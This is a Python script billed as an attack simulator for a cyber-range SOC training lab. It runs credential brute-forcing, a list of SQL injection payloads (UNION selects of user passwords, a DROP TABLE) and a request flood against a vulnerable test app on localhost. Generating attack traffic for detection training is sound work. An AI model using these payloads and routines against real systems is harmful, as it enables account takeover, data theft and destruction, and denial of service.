"""
Attack Simulator — Cyber Range SOC Lite
Generates realistic attack traffic against the vulnerable-app for SOC training.

Modes:
  brute   – brute-force login attempts
  sqli    – SQL injection probes on /api/data
  flood   – high-volume GET flood on /api/data
  all     – all three modes sequentially
"""

import argparse
import sys
import time
import random
from urllib.parse import urljoin

import requests
from colorama import init, Fore, Style

init(autoreset=True)

# ── Wordlists ──────────────────────────────────────────────────────

COMMON_PASSWORDS = [
    "123456", "password", "admin", "letmein", "welcome",
    "qwerty", "abc123", "monkey", "dragon", "master",
    "summer2024", "changeme", "passw0rd", "iloveyou", "trustno1",
    "hunter", "ranger", "shadow", "soccer", "starwars",
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "admin' --",
    "admin' #",
    "' UNION SELECT 1,2,3,4 --",
    "' UNION SELECT id, username, password, role FROM users --",
    "1' AND 1=1",
    "1' AND 1=2",
    "'; DROP TABLE stored_data; --",
    "' OR 1=1 LIMIT 5 --",
    "' UNION SELECT sql,2,3,4 FROM sqlite_master --",
]

USERNAMES = ["admin", "operator", "guest", "root", "test"]


# ── Coloured output helpers ────────────────────────────────────────

def info(msg):
    print(f"{Fore.CYAN}[*]{Style.RESET_ALL} {msg}")


def good(msg):
    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {msg}")


def warn(msg):
    print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} {msg}")


def fail(msg):
    print(f"{Fore.RED}[-]{Style.RESET_ALL} {msg}")


# ── Attack modules ─────────────────────────────────────────────────

def brute_force(target: str, attempts: int, delay: float):
    url = urljoin(target, "/login")
    info(f"Brute-force targeting {url}")
    info(f"Trying {attempts} login attempts with delay={delay}s\n")

    success_count = 0
    for i in range(attempts):
        username = random.choice(USERNAMES)
        password = random.choice(COMMON_PASSWORDS)

        try:
            r = requests.post(
                url,
                json={"username": username, "password": password},
                timeout=5,
            )
        except requests.exceptions.ConnectionError:
            fail(f"[{i+1}/{attempts}] Connection refused — is the target up?")
            time.sleep(delay)
            continue
        except requests.exceptions.Timeout:
            warn(f"[{i+1}/{attempts}] Request timed out")
            time.sleep(delay)
            continue

        if r.status_code == 200:
            good(f"[{i+1}/{attempts}] SUCCESS — {username}:{password} → token={r.json().get('token','?')[:12]}...")
            success_count += 1
        elif "not found" in r.text:
            fail(f"[{i+1}/{attempts}] User not found: {username}")
        elif "Invalid password" in r.text:
            warn(f"[{i+1}/{attempts}] Wrong password for {username}: {password}")
        else:
            fail(f"[{i+1}/{attempts}] HTTP {r.status_code} — {r.text[:80]}")

        if r.elapsed.total_seconds() > 2:
            warn(f"    Slow response: {r.elapsed.total_seconds():.1f}s")

        time.sleep(delay)

    print()
    info(f"Brute-force complete. {success_count}/{attempts} logins succeeded.")


def sql_injection(target: str, attempts: int, delay: float):
    url = urljoin(target, "/api/data")
    info(f"SQL injection targeting {url}")
    info(f"Firing {attempts} payloads with delay={delay}s\n")

    anomalies = 0
    for i in range(min(attempts, len(SQLI_PAYLOADS))):
        payload = SQLI_PAYLOADS[i]

        try:
            r = requests.get(url, params={"user_id": payload}, timeout=5)
        except requests.exceptions.ConnectionError:
            fail(f"[{i+1}/{attempts}] Connection refused")
            time.sleep(delay)
            continue
        except requests.exceptions.Timeout:
            warn(f"[{i+1}/{attempts}] Timed out")
            time.sleep(delay)
            continue

        if r.status_code == 200 and len(r.json()) > 0:
            good(f"[{i+1}/{attempts}] INJECTION LIKELY — payload={payload!r} → {len(r.json())} rows returned")
            for row in r.json()[:2]:
                print(f"         secret={row.get('secret','')[:60]}")
            anomalies += 1
        elif r.status_code == 200 and len(r.json()) == 0:
            warn(f"[{i+1}/{attempts}] No rows — payload={payload!r}")
        elif "UNION" in payload.upper() and r.status_code == 200:
            good(f"[{i+1}/{attempts}] UNION injection returned data")
            anomalies += 1
        else:
            fail(f"[{i+1}/{attempts}] HTTP {r.status_code} — payload={payload!r}")

        time.sleep(delay)

    print()
    info(f"SQLi complete. {anomalies}/{attempts} payloads triggered a response.")


def flood(target: str, attempts: int, delay: float):
    url = urljoin(target, "/api/data")
    info(f"Flooding {url} with {attempts} requests (delay={delay}s)\n")

    times = []
    success = 0
    for i in range(attempts):
        start = time.monotonic()
        try:
            r = requests.get(url, timeout=10)
            elapsed = time.monotonic() - start
            times.append(elapsed)

            if r.status_code == 200:
                success += 1
                status = f"{Fore.GREEN}{r.status_code}{Style.RESET_ALL}"
            elif r.status_code == 429:
                status = f"{Fore.YELLOW}{r.status_code} (rate-limited){Style.RESET_ALL}"
            elif r.status_code >= 500:
                status = f"{Fore.RED}{r.status_code} (server error){Style.RESET_ALL}"
            else:
                status = f"{Fore.YELLOW}{r.status_code}{Style.RESET_ALL}"

            print(f"\r  [{i+1}/{attempts}] {status}  {elapsed:.3f}s", end="")
        except requests.exceptions.RequestException as e:
            fail(f"\n  [{i+1}/{attempts}] Error: {e}")
            times.append(0)

        time.sleep(delay)

    print()
    if times:
        avg = sum(t for t in times if t) / max(len([t for t in times if t]), 1)
        info(f"Flood complete. {success}/{attempts} succeeded. Avg response: {avg:.3f}s")


# ── Main ───────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Attack Simulator — generates attack traffic against a target web app.",
    )
    parser.add_argument(
        "--target", default="http://localhost:8001",
        help="Target base URL. In Docker use http://target-app:8000 (default: http://localhost:8001)",
    )
    parser.add_argument(
        "--attempts", type=int, default=20,
        help="Number of requests per attack (default: 20)",
    )
    parser.add_argument(
        "--delay", type=float, default=0.5,
        help="Seconds between requests (default: 0.5)",
    )
    parser.add_argument(
        "--attack", choices=["brute", "sqli", "flood", "all"], default="all",
        help="Which attack to run (default: all)",
    )

    args = parser.parse_args()

    print(f"""
{Fore.CYAN}╔══════════════════════════════════════╗
║   Cyber Range — Attack Simulator    ║
╚══════════════════════════════════════╝{Style.RESET_ALL}
""")
    info(f"Target:   {args.target}")
    info(f"Attempts: {args.attempts}")
    info(f"Delay:    {args.delay}s")
    print()

    attacks = {
        "brute": brute_force,
        "sqli": sql_injection,
        "flood": flood,
    }

    if args.attack == "all":
        order = ["brute", "sqli", "flood"]
    else:
        order = [args.attack]

    for name in order:
        divider = "─" * 50
        print(f"\n{Fore.MAGENTA}{divider}")
        print(f"  Starting: {name.upper()}")
        print(f"{divider}{Style.RESET_ALL}\n")
        attacks[name](args.target, args.attempts, args.delay)
        print(f"\n{Fore.MAGENTA}{divider}{Style.RESET_ALL}\n")

    info("All attacks finished.")


if __name__ == "__main__":
    main()
